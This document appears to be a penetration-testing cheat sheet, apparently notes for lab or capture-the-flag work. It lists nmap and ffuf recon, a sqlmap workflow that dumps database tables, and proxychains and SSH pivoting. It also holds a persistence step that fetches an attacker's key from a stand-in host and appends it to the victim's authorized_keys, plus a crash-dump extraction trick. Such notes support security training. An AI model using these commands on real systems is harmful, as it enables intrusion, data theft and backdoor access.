# Initial Recon

## nmap

1. `nmap -sSV -Pn -p- -A <target>`
2. `nmap -sU -v <target> --min-rate=50`

## Sub-domain Enum

1. `ffuf -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/' -H 'HOST: FUZZ.website.com' -fs 2309`
3. `python3 sublist3r -d <domain>`

## Sub-Directoy Enum

1. `ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<SERVER_IP>:<PORT>/FUZZ" -recursion -recursion-depth 1 -e .php`
2. `gobuster dir -x php,txt -u 10.129.255.70 -w /usr/share/wordlists/dirb/common.txt`

## Parameter Fuzzing

1. `ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`
2. `ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<SERVER_IP>:<PORT>/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`

## Page Type Fuzzing

1. `ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u "http://<SERVER_IP>:<PORT>/indexFUZZ"`


# Web Attacks

## SQLmap

- GET: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php?id=1"`
- POST: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1"`
- Cookies: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --cookie="id=1*"`
- JSON:  `Copy Request Headers --> req.txt; add in the JSON with "" surrounding the variables; sqlmap -r req.txt`


1. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" --dbs`
2. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> --tables`
3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> --dump`
4. 3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> -C <column> --dump`

`--flush-session` to start again

`--no-cast` to ensure correct data is gotten from blind sql

`--risk=3` and `--level=5` for more aggressive SQLi detection

`--prefix` and `--suffix` to predefine the wrappers

`--csrf-token` to define the variable name that is the token

`--union-cols=n` to manually specify number of union columns 

Proxy chains
---
```
edit /etc/proxychains4.conf 

examples:
http <ip> <port>
socks5 <victim service> <victim port> <user> <password>

$ proxychains ssh user@<ip>
```

SSH port forwarding
---

append your pub key to `/home/user/.ssh/authorized_keys`

On your attacker machine:

`ssh -L <local port>:<victim service>:<victim port> <victim>@<ip>`

OR using dynamic forwarding for attacks

`ssh -D <local port> <victim>@<ip>`


Adding your SSH to the victim
---

Append your public to the victim's ~/.ssh/authorized_keys

```
On attacker:
ssh-keygen

On victim:
wget http://attacker/id_rsa.pub
cat id_rsa.pub >> ~/.ssh/authorized_keys
```

Getting Crash Data
---

While program is running, kill it with

```
kill -BUS <pid>

Get the data from the crash log
---
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashed
strings /tmp/crashed/CoreDump
```

Other stuff
---
- Check SSL cert
- Check email domains
- Check 404 pages
- Try both `/tmp` and `/dev/shm` for file writes
